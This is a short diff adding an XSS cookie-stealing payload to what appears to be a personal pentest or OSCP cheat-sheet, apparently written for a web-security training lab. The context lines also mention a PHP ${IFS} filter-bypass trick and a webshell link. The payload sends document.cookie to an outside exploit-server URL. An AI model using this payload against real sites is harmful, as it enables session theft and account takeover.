@@ -28,3 +28,9 @@ in php " " == ${IFS}
 ```
 ---
 [backdore php](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)
+
+---
+xss ngrpk paylode
+```js
+<script> var i=new Image(); i.src='https://exploit-0acc00b804bd4cfac0c1a75b017a007d.web-security-academy.net/exploit?='+document.cookie</script>
+```
